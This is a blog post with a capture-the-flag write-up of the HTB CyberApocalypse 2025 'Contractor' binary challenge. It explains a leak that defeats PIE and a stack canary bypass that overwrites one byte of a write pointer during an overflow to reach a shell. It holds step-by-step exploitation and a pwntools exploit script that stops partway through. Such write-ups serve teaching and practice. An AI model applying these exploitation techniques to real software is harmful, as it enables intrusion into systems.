<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en"><head>

<meta charset="utf-8">
<meta name="generator" content="quarto-1.4.551">

<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">

<meta name="dcterms.date" content="2025-05-01">
<meta name="description" content="Detailed analysis of the HTB CyberApocalypse 2025 ‘Contractor’ pwn challenge, demonstrating a technique to bypass stack canaries by corrupting a stack pointer during an overflow.">

<title>Matej Olexa - HTB CyberApocalypse 2025 - Contractor: Exploiting Stack Pointer Corruption to Bypass Canaries</title>
<style>
code{white-space: pre-wrap;}
span.smallcaps{font-variant: small-caps;}
div.columns{display: flex; gap: min(4vw, 1.5em);}
div.column{flex: auto; overflow-x: auto;}
div.hanging-indent{margin-left: 1.5em; text-indent: -1.5em;}
ul.task-list{list-style: none;}
ul.task-list li input[type="checkbox"] {
  width: 0.8em;
  margin: 0 0.8em 0.2em -1em; /* quarto-specific, see https://github.com/quarto-dev/quarto-cli/issues/4556 */ 
  vertical-align: middle;
}
/* CSS for syntax highlighting */
pre > code.sourceCode { white-space: pre; position: relative; }
pre > code.sourceCode > span { line-height: 1.25; }
pre > code.sourceCode > span:empty { height: 1.2em; }
.sourceCode { overflow: visible; }
code.sourceCode > span { color: inherit; text-decoration: inherit; }
div.sourceCode { margin: 1em 0; }
pre.sourceCode { margin: 0; }
@media screen {
div.sourceCode { overflow: auto; }
}
@media print {
pre > code.sourceCode { white-space: pre-wrap; }
pre > code.sourceCode > span { text-indent: -5em; padding-left: 5em; }
}
pre.numberSource code
  { counter-reset: source-line 0; }
pre.numberSource code > span
  { position: relative; left: -4em; counter-increment: source-line; }
pre.numberSource code > span > a:first-child::before
  { content: counter(source-line);
    position: relative; left: -1em; text-align: right; vertical-align: baseline;
    border: none; display: inline-block;
    -webkit-touch-callout: none; -webkit-user-select: none;
    -khtml-user-select: none; -moz-user-select: none;
    -ms-user-select: none; user-select: none;
    padding: 0 4px; width: 4em;
  }
pre.numberSource { margin-left: 3em;  padding-left: 4px; }
div.sourceCode
  {   }
@media screen {
pre > code.sourceCode > span > a:first-child::before { text-decoration: underline; }
}
</style>


<script src="../site_libs/quarto-nav/quarto-nav.js"></script>
<script src="../site_libs/quarto-nav/headroom.min.js"></script>
<script src="../site_libs/clipboard/clipboard.min.js"></script>
<script src="../site_libs/quarto-search/autocomplete.umd.js"></script>
<script src="../site_libs/quarto-search/fuse.min.js"></script>
<script src="../site_libs/quarto-search/quarto-search.js"></script>
<meta name="quarto:offset" content="../">
<script src="../site_libs/quarto-html/quarto.js"></script>
<script src="../site_libs/quarto-html/popper.min.js"></script>
<script src="../site_libs/quarto-html/tippy.umd.min.js"></script>
<script src="../site_libs/quarto-html/anchor.min.js"></script>
<link href="../site_libs/quarto-html/tippy.css" rel="stylesheet">
<link href="../site_libs/quarto-html/quarto-syntax-highlighting-dark.css" rel="stylesheet" id="quarto-text-highlighting-styles">
<script src="../site_libs/bootstrap/bootstrap.min.js"></script>
<link href="../site_libs/bootstrap/bootstrap-icons.css" rel="stylesheet">
<link href="../site_libs/bootstrap/bootstrap.min.css" rel="stylesheet" id="quarto-bootstrap" data-mode="dark">
<script id="quarto-search-options" type="application/json">{
  "location": "navbar",
  "copy-button": false,
  "collapse-after": 3,
  "panel-placement": "end",
  "type": "overlay",
  "limit": 50,
  "keyboard-shortcut": [
    "f",
    "/",
    "s"
  ],
  "show-item-context": false,
  "language": {
    "search-no-results-text": "No results",
    "search-matching-documents-text": "matching documents",
    "search-copy-link-title": "Copy link to search",
    "search-hide-matches-text": "Hide additional matches",
    "search-more-match-text": "more match in this document",
    "search-more-matches-text": "more matches in this document",
    "search-clear-button-title": "Clear",
    "search-text-placeholder": "",
    "search-detached-cancel-button-title": "Cancel",
    "search-submit-button-title": "Submit",
    "search-label": "Search"
  }
}</script>


<link rel="stylesheet" href="../styles.css">
</head>

<body class="nav-fixed">

<div id="quarto-search-results"></div>
  <header id="quarto-header" class="headroom fixed-top">
    <nav class="navbar navbar-expand-lg " data-bs-theme="dark">
      <div class="navbar-container container-fluid">
      <div class="navbar-brand-container mx-auto">
    <a class="navbar-brand" href="/">
    <span class="navbar-title">Matej Olexa</span>
    </a>
  </div>
            <div id="quarto-search" class="" title="Search"></div>
          <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarCollapse" aria-controls="navbarCollapse" aria-expanded="false" aria-label="Toggle navigation" onclick="if (window.quartoToggleHeadroom) { window.quartoToggleHeadroom(); }">
  <span class="navbar-toggler-icon"></span>
</button>
          <div class="collapse navbar-collapse" id="navbarCollapse">
            <ul class="navbar-nav navbar-nav-scroll me-auto">
  <li class="nav-item">
    <a class="nav-link" href="/"> 
<span class="menu-text">Home</span></a>
  </li>  
  <li class="nav-item">
    <a class="nav-link" href="../blogs/index.html"> 
<span class="menu-text">Blog</span></a>
  </li>  
</ul>
            <ul class="navbar-nav navbar-nav-scroll ms-auto">
  <li class="nav-item compact">
    <a class="nav-link" href="https://github.com/olexamatej"> <i class="bi bi-github" role="img">
</i> 
<span class="menu-text"></span></a>
  </li>  
  <li class="nav-item compact">
    <a class="nav-link" href="https://www.linkedin.com/in/matej-olexa-0b7883222/"> <i class="bi bi-linkedin" role="img">
</i> 
<span class="menu-text"></span></a>
  </li>  
</ul>
          </div> <!-- /navcollapse -->
          <div class="quarto-navbar-tools">
</div>
      </div> <!-- /container-fluid -->
    </nav>
</header>
<!-- content -->
<div id="quarto-content" class="quarto-container page-columns page-rows-contents page-layout-article page-navbar">
<!-- sidebar -->
<!-- margin-sidebar -->
    <div id="quarto-margin-sidebar" class="sidebar margin-sidebar">
        <nav id="TOC" role="doc-toc" class="toc-active">
    <h2 id="toc-title">On this page</h2>
   
  <ul>
  <li><a href="#introduction" id="toc-introduction" class="nav-link active" data-scroll-target="#introduction">Introduction</a></li>
  <li><a href="#binary-analysis-context-scenario" id="toc-binary-analysis-context-scenario" class="nav-link" data-scroll-target="#binary-analysis-context-scenario">Binary Analysis Context &amp; Scenario</a></li>
  <li><a href="#vulnerability-1-information-leak-via-unterminated-string-read" id="toc-vulnerability-1-information-leak-via-unterminated-string-read" class="nav-link" data-scroll-target="#vulnerability-1-information-leak-via-unterminated-string-read">Vulnerability 1: Information Leak via Unterminated String Read</a></li>
  <li><a href="#vulnerability-2-stack-buffer-overflow" id="toc-vulnerability-2-stack-buffer-overflow" class="nav-link" data-scroll-target="#vulnerability-2-stack-buffer-overflow">Vulnerability 2: Stack Buffer Overflow</a></li>
  <li><a href="#vulnerability-3-stack-layout-canary-bypass-via-stack-pointer-corruption" id="toc-vulnerability-3-stack-layout-canary-bypass-via-stack-pointer-corruption" class="nav-link" data-scroll-target="#vulnerability-3-stack-layout-canary-bypass-via-stack-pointer-corruption">Vulnerability 3 &amp; Stack Layout: Canary Bypass via Stack Pointer Corruption</a></li>
  <li><a href="#exploitation-method-step-by-step" id="toc-exploitation-method-step-by-step" class="nav-link" data-scroll-target="#exploitation-method-step-by-step">Exploitation Method Step-by-Step</a></li>
  <li><a href="#exploit-code-snippet-pwntools" id="toc-exploit-code-snippet-pwntools" class="nav-link" data-scroll-target="#exploit-code-snippet-pwntools">Exploit Code Snippet (Pwntools)</a></li>
  <li><a href="#conclusion" id="toc-conclusion" class="nav-link" data-scroll-target="#conclusion">Conclusion</a></li>
  </ul>
</nav>
    </div>
<!-- main -->
<main class="content" id="quarto-document-content">

<header id="title-block-header" class="quarto-title-block default">
<div class="quarto-title">
<h1 class="title">HTB CyberApocalypse 2025 - Contractor: Exploiting Stack Pointer Corruption to Bypass Canaries</h1>
  <div class="quarto-categories">
    <div class="quarto-category">pwn</div>
    <div class="quarto-category">cyberapocalypse2025</div>
    <div class="quarto-category">stack</div>
  </div>
  </div>

<div>
  <div class="description">
    Detailed analysis of the HTB CyberApocalypse 2025 ‘Contractor’ pwn challenge, demonstrating a technique to bypass stack canaries by corrupting a stack pointer during an overflow.
  </div>
</div>


<div class="quarto-title-meta">

    
    <div>
    <div class="quarto-title-meta-heading">Published</div>
    <div class="quarto-title-meta-contents">
      <p class="date">May 1, 2025</p>
    </div>
  </div>
  
    
  </div>
  


</header>


<section id="introduction" class="level2">
<h2 class="anchored" data-anchor-id="introduction">Introduction</h2>
<p>Stack buffer overflows are a classic vulnerability class, but modern defenses like Stack Canaries, NX (Non-Executable Stack), and PIE (Position Independent Executable) significantly complicate exploitation. Standard overflows that overwrite the return address (RIP) often corrupt the canary value placed below it, causing the program to detect the tampering and terminate via <code>__stack_chk_fail</code>. This post delves into stack exploitation techniques demonstrated in the Hack The Box CyberApocalypse 2025 CTF (March 21-26). Specifically, we analyze the <code>contractor</code> challenge to illustrate how a specific stack layout and a vulnerability in pointer usage can be combined to bypass stack canaries <em>without</em> leaking the canary value itself, achieving control flow hijacking by corrupting a different stack-based pointer <em>during</em> the overflow.</p>
</section>
<section id="binary-analysis-context-scenario" class="level2">
<h2 class="anchored" data-anchor-id="binary-analysis-context-scenario">Binary Analysis Context &amp; Scenario</h2>
<p>The subject of this analysis is a 64-bit ELF binary from the CTF. The challenge description sets the scene:</p>
<blockquote class="blockquote">
<p>“Sir Alaric calls upon the bravest adventurers to join him in assembling the mightiest army in all of Eldoria. Together, you will safeguard the peace across the villages under his protection. Do you have the courage to answer the call?”</p>
</blockquote>
<p>The program interacts by taking user details (name, reason, age, specialty) and then allowing edits. Key security mitigations enabled present a significant challenge:</p>
<pre class="text"><code>[*] './contractor'
Arch:       amd64-64-little
RELRO:      Full RELRO       (GOT protected)
Stack:      Canary found     (Stack overflow detection)
NX:         NX enabled       (No shellcode execution on stack)
PIE:        PIE enabled      (Address space randomization for binary)
RUNPATH:    b'./glibc/'
SHSTK:      Enabled          (Shadow Stack, additional control-flow protection)
IBT:        Enabled          (Indirect Branch Tracking, more CFI)
Stripped:   No               (Symbols available, helps analysis)</code></pre>
<p>The presence of Canary, PIE, NX, SHSTK, and IBT means a simple overflow won’t work; we need leaks and a way around the control-flow integrity checks and canary. The core vulnerabilities lie in how the ‘specialty’ field input is handled. A function named <code>contract</code> exists, which simply calls <code>execl("/bin/sh", "sh", 0)</code>, making it an ideal target address for our exploit payload.</p>
<div class="sourceCode" id="cb2"><pre class="sourceCode c code-with-copy"><code class="sourceCode c"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="dt">int64_t</span> contract<span class="op">()</span> <span class="op">{</span></span>
<span id="cb2-2"><a href="#cb2-2" aria-hidden="true" tabindex="-1"></a>    <span class="co">// Simplified - includes canary check logic before/after execl</span></span>
<span id="cb2-3"><a href="#cb2-3" aria-hidden="true" tabindex="-1"></a>    execl<span class="op">(</span><span class="st">"/bin/sh"</span><span class="op">,</span> <span class="st">"sh"</span><span class="op">,</span> <span class="dv">0</span><span class="op">);</span> <span class="co">// The goal function</span></span>
<span id="cb2-4"><a href="#cb2-4" aria-hidden="true" tabindex="-1"></a>    <span class="co">// ... canary check logic ...</span></span>
<span id="cb2-5"><a href="#cb2-5" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> <span class="op">(</span>canary_corrupted<span class="op">)</span> <span class="op">{</span></span>
<span id="cb2-6"><a href="#cb2-6" aria-hidden="true" tabindex="-1"></a>        __stack_chk_fail<span class="op">();</span> <span class="co">// Abort if canary is wrong</span></span>
<span id="cb2-7"><a href="#cb2-7" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
<span id="cb2-8"><a href="#cb2-8" aria-hidden="true" tabindex="-1"></a>    <span class="cf">return</span> <span class="dv">0</span><span class="op">;</span> <span class="co">// Or similar exit path if execl fails</span></span>
<span id="cb2-9"><a href="#cb2-9" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
</section>
<section id="vulnerability-1-information-leak-via-unterminated-string-read" class="level2">
<h2 class="anchored" data-anchor-id="vulnerability-1-information-leak-via-unterminated-string-read">Vulnerability 1: Information Leak via Unterminated String Read</h2>
<p>The initial input routine reading the <code>specialty</code> field copies user input byte-by-byte into a 16-byte buffer on the stack.</p>
<div class="sourceCode" id="cb3"><pre class="sourceCode c code-with-copy"><code class="sourceCode c"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a><span class="co">// Simplified C representation of the initial input loop for 'specialty'</span></span>
<span id="cb3-2"><a href="#cb3-2" aria-hidden="true" tabindex="-1"></a><span class="dt">char</span> specialty_buffer<span class="op">[</span><span class="dv">16</span><span class="op">];</span></span>
<span id="cb3-3"><a href="#cb3-3" aria-hidden="true" tabindex="-1"></a><span class="dt">char</span> byte_read<span class="op">;</span></span>
<span id="cb3-4"><a href="#cb3-4" aria-hidden="true" tabindex="-1"></a><span class="dt">int</span> i <span class="op">=</span> <span class="dv">0</span><span class="op">;</span></span>
<span id="cb3-5"><a href="#cb3-5" aria-hidden="true" tabindex="-1"></a><span class="cf">while</span> <span class="op">(</span>i <span class="op">&lt;=</span> <span class="bn">0xf</span><span class="op">)</span> <span class="co">// Reads up to 16 bytes (index 0 to 15)</span></span>
<span id="cb3-6"><a href="#cb3-6" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span>
<span id="cb3-7"><a href="#cb3-7" aria-hidden="true" tabindex="-1"></a>    read<span class="op">(</span><span class="dv">0</span><span class="op">,</span> <span class="op">&amp;</span>byte_read<span class="op">,</span> <span class="dv">1</span><span class="op">);</span></span>
<span id="cb3-8"><a href="#cb3-8" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> <span class="op">(</span>byte_read <span class="op">==</span> <span class="ch">'</span><span class="sc">\n</span><span class="ch">'</span><span class="op">)</span></span>
<span id="cb3-9"><a href="#cb3-9" aria-hidden="true" tabindex="-1"></a>        <span class="cf">break</span><span class="op">;</span></span>
<span id="cb3-10"><a href="#cb3-10" aria-hidden="true" tabindex="-1"></a>    specialty_buffer<span class="op">[</span>i<span class="op">]</span> <span class="op">=</span> byte_read<span class="op">;</span></span>
<span id="cb3-11"><a href="#cb3-11" aria-hidden="true" tabindex="-1"></a>    i<span class="op">++;</span></span>
<span id="cb3-12"><a href="#cb3-12" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
<span id="cb3-13"><a href="#cb3-13" aria-hidden="true" tabindex="-1"></a><span class="co">// CRITICAL FLAW: If exactly 16 bytes are read (i=16) before a newline,</span></span>
<span id="cb3-14"><a href="#cb3-14" aria-hidden="true" tabindex="-1"></a><span class="co">// no null terminator ('\0') is added to specialty_buffer!</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>Later, when the program displays a summary of the entered information, it likely uses standard C library functions like <code>printf</code> or <code>puts</code> to print the <code>specialty</code>. These functions expect null-terminated strings. If <code>specialty_buffer</code> lacks a null terminator, these functions will continue reading adjacent data from the stack beyond the intended 16 bytes until they encounter a null byte or cause a crash.</p>
<p>Dynamic analysis (debugging with GDB/GEF) reveals that a pointer <em>into the binary’s own code segment</em> (.text) resides on the stack immediately following <code>specialty_buffer</code>. When the unterminated buffer is printed, this pointer’s bytes are included in the output, effectively leaking a runtime address within the binary.</p>
<p><strong>Bypassing PIE:</strong> This address leak is crucial for defeating PIE. 1. <strong>Leak:</strong> Obtain the leaked runtime address (e.g., <code>0x55...5b50</code>). 2. <strong>Analyze:</strong> Determine the static offset of this address relative to the binary’s base address using static analysis tools (e.g., Binary Ninja, <code>objdump</code>). Let’s assume this offset is <code>0x1b50</code>. 3. <strong>Calculate:</strong> Compute the runtime base address: <code>Runtime Base = Leaked Address - Static Offset</code> (e.g., <code>0x55...4000 = 0x55...5b50 - 0x1b50</code>). With the base address known, we can calculate the runtime address of any desired function (<code>contract</code>) or ROP gadget within the binary.</p>
</section>
<section id="vulnerability-2-stack-buffer-overflow" class="level2">
<h2 class="anchored" data-anchor-id="vulnerability-2-stack-buffer-overflow">Vulnerability 2: Stack Buffer Overflow</h2>
<p>When the user chooses option 4 to <em>edit</em> the <code>specialty</code> field, a different, more dangerous input routine is invoked.</p>
<div class="sourceCode" id="cb4"><pre class="sourceCode c code-with-copy"><code class="sourceCode c"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="co">// Simplified C representation of the EDIT specialty loop</span></span>
<span id="cb4-2"><a href="#cb4-2" aria-hidden="true" tabindex="-1"></a><span class="co">// rax_10 often holds a pointer related to the start of the stack frame or struct</span></span>
<span id="cb4-3"><a href="#cb4-3" aria-hidden="true" tabindex="-1"></a><span class="dt">char</span> safe_buffer<span class="op">;</span> <span class="co">// Reads one byte at a time</span></span>
<span id="cb4-4"><a href="#cb4-4" aria-hidden="true" tabindex="-1"></a><span class="dt">int</span> i <span class="op">=</span> <span class="dv">0</span><span class="op">;</span></span>
<span id="cb4-5"><a href="#cb4-5" aria-hidden="true" tabindex="-1"></a><span class="cf">while</span> <span class="op">(</span>i <span class="op">&lt;=</span> <span class="bn">0xff</span><span class="op">)</span> <span class="co">// Loop condition allows reading up to 256 bytes!</span></span>
<span id="cb4-6"><a href="#cb4-6" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span>
<span id="cb4-7"><a href="#cb4-7" aria-hidden="true" tabindex="-1"></a>    read<span class="op">(</span><span class="dv">0</span><span class="op">,</span> <span class="op">&amp;</span>safe_buffer<span class="op">,</span> <span class="dv">1</span><span class="op">);</span></span>
<span id="cb4-8"><a href="#cb4-8" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> <span class="op">(</span>safe_buffer <span class="op">==</span> <span class="ch">'</span><span class="sc">\n</span><span class="ch">'</span><span class="op">)</span></span>
<span id="cb4-9"><a href="#cb4-9" aria-hidden="true" tabindex="-1"></a>        <span class="cf">break</span><span class="op">;</span></span>
<span id="cb4-10"><a href="#cb4-10" aria-hidden="true" tabindex="-1"></a>    <span class="co">// Calculation eventually targets the 16-byte specialty_buffer area</span></span>
<span id="cb4-11"><a href="#cb4-11" aria-hidden="true" tabindex="-1"></a>    <span class="op">*(</span><span class="dt">uint8_t</span><span class="op">*)(</span>rax_10 <span class="op">+</span> <span class="op">(</span><span class="dt">int64_t</span><span class="op">)</span>i <span class="op">+</span> <span class="bn">0x10</span><span class="op">)</span> <span class="op">=</span> safe_buffer<span class="op">;</span></span>
<span id="cb4-12"><a href="#cb4-12" aria-hidden="true" tabindex="-1"></a>    i<span class="op">++;</span></span>
<span id="cb4-13"><a href="#cb4-13" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>This loop reads up to 256 bytes but attempts to write them into the stack region allocated for the 16-byte <code>specialty</code>. This provides a classic stack buffer overflow primitive, allowing an attacker to write data beyond the intended buffer, potentially overwriting saved registers (like RBP) and, crucially, the saved return address (RIP).</p>
</section>
<section id="vulnerability-3-stack-layout-canary-bypass-via-stack-pointer-corruption" class="level2">
<h2 class="anchored" data-anchor-id="vulnerability-3-stack-layout-canary-bypass-via-stack-pointer-corruption">Vulnerability 3 &amp; Stack Layout: Canary Bypass via Stack Pointer Corruption</h2>
<p>The primary obstacle to exploiting the overflow is the stack canary, placed by the compiler between local variables (like <code>specialty_buffer</code>) and the saved frame pointer (RBP) / return address (RIP) to detect overflows. A direct overflow overwriting RIP would also overwrite the canary, triggering <code>__stack_chk_fail</code>. This challenge allows bypassing the canary due to a specific stack layout and how the overflow write is implemented.</p>
<p><strong>Detailed Stack Layout Analysis (via Debugging):</strong> Dynamic analysis reveals the precise layout of relevant data on the stack during the execution of the function containing the vulnerable edit loop (higher addresses are “up” the stack, closer to the function return):</p>
<pre class="text"><code>      +-------------------------+ High Address  &lt;-- Function Return
      | Saved RIP               | **Target for Overwrite** (Controls execution flow)
      +-------------------------+
      | Stack Canary            | **Obstacle** (Must NOT be modified before check)
      +-------------------------+
      | Saved RBP (Frame Ptr)   | (Often overwritten, but less critical here)
      +-------------------------+
      | Stack Ptr (*inf_ptr)    | ***Corruption Target*** (Pointer TO the user info struct)
      +-------------------------+
      | Binary Ptr (leaked val) | (Value leaked in Vuln 1)
      +-------------------------+
      | specialty_buffer[16]    | ***Overflow Source*** (16-byte buffer)
      +-------------------------+
      | Other local vars...     | (name, reason, age buffers etc.)
      +-------------------------+ Low Address</code></pre>
<p><strong>Key Observations from Layout:</strong> * <strong><code>inf_ptr</code> Position:</strong> A pointer variable named <code>inf_ptr</code> (or similar, found via reversing) exists on the stack. This pointer holds the starting address of the structure containing the user’s name, reason, age, and specialty. Crucially, this <code>inf_ptr</code> variable is located <em>after</em> the <code>specialty_buffer</code> but <em>before</em> the Saved RBP and the Stack Canary. * <strong>Write Mechanism:</strong> The vulnerable <em>edit</em> loop (Vulnerability 2) calculates the destination address for <em>each byte</em> it writes using this <code>inf_ptr</code>: the conceptual write is <code>*(inf_ptr + field_offset + loop_index) = input_byte;</code>.</p>
<p><strong>The Corruption Mechanism:</strong> The bypass exploits the fact that the pointer used for writing (<code>inf_ptr</code>) can itself be overwritten <em>during the overflow</em>, and this change takes effect <em>immediately</em> for subsequent writes within the same loop execution. 1. The attacker crafts a payload that starts by filling the 16-byte <code>specialty_buffer</code>. 2. The payload continues, overflowing past the buffer and the leaked Binary Pointer area. 3. The payload reaches the memory location where the <code>inf_ptr</code> variable is stored. 4. The attacker carefully crafts the payload to overwrite <em>only the Least Significant Byte (LSB)</em> of the <code>inf_ptr</code> value with a specific byte (e.g., <code>\xcf</code>). The exact byte needed depends on the runtime stack alignment (influenced by ASLR) and must be found via trial-and-error or calculation if alignment patterns are known. 5. On the <em>next iteration</em> of the write loop (and all subsequent iterations), the now <em>corrupted</em> value of <code>inf_ptr</code> is used to calculate the write destination address. 6. The change in the LSB effectively shifts the calculated destination address higher up the stack. This causes the remaining part of the attacker’s payload (containing the desired ROP chain / target RIP address) to “jump” over the Saved RBP and the Stack Canary, landing directly onto the Saved RIP location.</p>
<p>Because the canary value itself is never overwritten, the <code>__stack_chk_fail</code> check passes when the function attempts to return, but execution resumes at the attacker-controlled address now stored in RIP.</p>
</section>
<section id="exploitation-method-step-by-step" class="level2">
<h2 class="anchored" data-anchor-id="exploitation-method-step-by-step">Exploitation Method Step-by-Step</h2>
<p>The exploitation strategy combines these vulnerabilities:</p>
<ol type="1">
<li><strong>Leak Binary Base Address:</strong>
<ul>
<li>Send initial inputs (name, reason, age).</li>
<li>Send exactly 16 non-newline bytes for the <code>specialty</code> to trigger the unterminated read (Vulnerability 1).</li>
<li>Receive the program’s output and parse the bytes immediately following the 16 input bytes to extract the leaked binary pointer.</li>
<li>Calculate the runtime base address of the binary using the leak and the known static offset.</li>
</ul></li>
<li><strong>Trigger Vulnerable Input:</strong>
<ul>
<li>Select menu option 4 to trigger the vulnerable <code>edit</code> function for the <code>specialty</code> field (Vulnerability 2).</li>
</ul></li>
<li><strong>Craft Payload for Canary Bypass and RIP Control:</strong>
<ul>
<li>Construct the payload buffer:
<ul>
<li><strong>Padding:</strong> Bytes (e.g., 32 <code>A</code>s) to fill the <code>specialty_buffer</code>, overflow past the saved binary pointer, and reach the LSB of the <code>inf_ptr</code> variable on the stack.</li>
<li><strong>Corruption Byte:</strong> The specific byte (e.g., <code>\xcf</code>) calculated or guessed to corrupt the LSB of <code>inf_ptr</code> appropriately for the current stack alignment.</li>
<li><strong>ROP Chain:</strong> The sequence of addresses to be written to the stack <em>using the corrupted <code>inf_ptr</code></em>. This typically includes:
<ul>
<li><code>p64(address_of_ret_gadget)</code>: A <code>ret</code> instruction address (calculated using the leaked base address). This is often needed for stack alignment before calling functions, especially in 64-bit Linux.</li>
<li><code>p64(address_of_contract_function)</code>: The target function address (calculated using the leaked base address).</li>
</ul></li>
</ul></li>
</ul></li>
<li><strong>Send Payload and Confirm:</strong>
<ul>
<li>Send the crafted payload buffer when prompted for the new specialty.</li>
<li>Send the confirmation (e.g., “Yes”) to finalize the edit.</li>
</ul></li>
<li><strong>Achieve Control:</strong>
<ul>
<li>If the LSB corruption byte was correct for the current stack alignment, the payload overwrites the Saved RIP via the corrupted pointer mechanism, bypassing the canary check.</li>
<li>When the function returns, execution jumps to the <code>ret</code> gadget, then to the <code>contract</code> function, executing <code>execl("/bin/sh", ...)</code>.</li>
</ul></li>
<li><strong>Retry if Necessary:</strong>
<ul>
<li>Because the success of the LSB corruption depends on runtime stack alignment (ASLR), the correct byte might vary slightly between executions.</li>
<li>Wrap the core exploitation logic (steps 2-5) in a loop that automatically restarts the process if it fails (e.g., the connection closes or expected output isn’t received), trying the same corruption byte until it aligns correctly by chance.</li>
</ul></li>
</ol>
</section>
<section id="exploit-code-snippet-pwntools" class="level2">
<h2 class="anchored" data-anchor-id="exploit-code-snippet-pwntools">Exploit Code Snippet (Pwntools)</h2>
<div class="sourceCode" id="cb6"><pre class="sourceCode python code-with-copy"><code class="sourceCode python"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a><span class="co">#!/usr/bin/python3</span></span>
<span id="cb6-2"><a href="#cb6-2" aria-hidden="true" tabindex="-1"></a><span class="im">from</span> pwn <span class="im">import</span> <span class="op">*</span></span>
<span id="cb6-3"><a href="#cb6-3" aria-hidden="true" tabindex="-1"></a><span class="im">import</span> warnings</span>
<span id="cb6-4"><a href="#cb6-4" aria-hidden="true" tabindex="-1"></a><span class="im">import</span> os</span>
<span id="cb6-5"><a href="#cb6-5" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb6-6"><a href="#cb6-6" aria-hidden="true" tabindex="-1"></a><span class="co"># --- Setup ---</span></span>
<span id="cb6-7"><a href="#cb6-7" aria-hidden="true" tabindex="-1"></a>context.arch <span class="op">=</span> <span class="st">'amd64'</span></span>
<span id="cb6-8"><a href="#cb6-8" aria-hidden="true" tabindex="-1"></a><span class="co"># context.log_level = 'debug' # Use debug for verbose output</span></span>
<span id="cb6-9"><a href="#cb6-9" aria-hidden="true" tabindex="-1"></a>context.log_level <span class="op">=</span> <span class="st">'critical'</span> <span class="co"># Use critical for clean retry loop</span></span>
<span id="cb6-10"><a href="#cb6-10" aria-hidden="true" tabindex="-1"></a>warnings.filterwarnings(<span class="st">'ignore'</span>)</span>
<span id="cb6-11"><a href="#cb6-11" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb6-12"><a href="#cb6-12" aria-hidden="true" tabindex="-1"></a>target <span class="op">=</span> <span class="st">'./contractor'</span></span>
<span id="cb6-13"><a href="#cb6-13" aria-hidden="true" tabindex="-1"></a>elf <span class="op">=</span> ELF(target)</span>
<span id="cb6-14"><a href="#cb6-14" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb6-15"><a href="#cb6-15" aria-hidden="true" tabindex="-1"></a><span class="co"># --- Retry Loop ---</span></span>
<span id="cb6-16"><a href="#cb6-16" aria-hidden="true" tabindex="-1"></a>attempt_count <span class="op">=</span> <span class="dv">0</span></span>
<span id="cb6-17"><a href="#cb6-17" aria-hidden="true" tabindex="-1"></a><span class="cf">while</span> <span class="va">True</span>:</span>
<span id="cb6-18"><a href="#cb6-18" aria-hidden="true" tabindex="-1"></a>    attempt_count <span class="op">+=</span> <span class="dv">1</span></span>
<span id="cb6-19"><a href="#cb6-19" aria-hidden="true" tabindex="-1"></a>    <span class="cf">try</span>:</span>
<span id="cb6-20"><a href="#cb6-20" aria-hidden="true" tabindex="-1"></a>        <span class="co"># connection = remote('ip', port) # For remote target</span></span>
<span id="cb6-21"><a href="#cb6-21" aria-hidden="true" tabindex="-1"></a>        connection <span class="op">=</span> process(target) <span class="co"># Use process for local testing</span></span>
<span id="cb6-22"><a href="#cb6-22" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb6-23"><a href="#cb6-23" aria-hidden="true" tabindex="-1"></a>        <span class="co"># --- Initial Interaction (Dummy data) ---</span></span>
<span id="cb6-24"><a href="#cb6-24" aria-hidden="true" tabindex="-1"></a>        connection.sendlineafter(<span class="st">b'&gt; '</span>, <span class="st">b'Exploiter'</span>)</span>
<span id="cb6-25"><a href="#cb6-25" aria-hidden="true" tabindex="-1"></a>        connection.sendlineafter(<span class="st">b'&gt; '</span>, <span class="st">b'Bypassing Canary'</span>)</span>
<span id="cb6-26"><a href="#cb6-26" aria-hidden="true" tabindex="-1"></a>        connection.sendlineafter(<span class="st">b'&gt; '</span>, <span class="st">b'99'</span>)</span>
<span id="cb6-27"><a href="#cb6-27" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb6-28"><a href="#cb6-28" aria-hidden="true" tabindex="-1"></a>        <span class="co"># --- 1. Leak Address ---</span></span>
<span id="cb6-29"><a href="#cb6-29" aria-hidden="true" tabindex="-1"></a>        leak_trigger <span class="op">=</span> <span class="st">b'A'</span> <span class="op">*</span> <span class="dv">16</span> <span class="co"># Exactly 16 bytes, no newline</span></span>
<span id="cb6-30"><a href="#cb6-30" aria-hidden="true" tabindex="-1"></a>        connection.sendlineafter(<span class="st">b'&gt; '</span>, leak_trigger)</span>
<span id="cb6-31"><a href="#cb6-31" aria-hidden="true" tabindex="-1"></a>        connection.recvuntil(leak_trigger) <span class="co"># Read until the end of our input</span></span>
<span id="cb6-32"><a href="#cb6-32" aria-hidden="true" tabindex="-1"></a>        leaked_bytes <span class="op">=</span> connection.recvline().strip() <span class="co"># Next line contains leak</span></span>
<span id="cb6-33"><a href="#cb6-33" aria-hidden="true" tabindex="-1"></a>        <span class="co"># Ensure correct padding and unpacking</span></span>
<span id="cb6-34"><a href="#cb6-34" aria-hidden="true" tabindex="-1"></a>        <span class="cf">try</span>:</span>
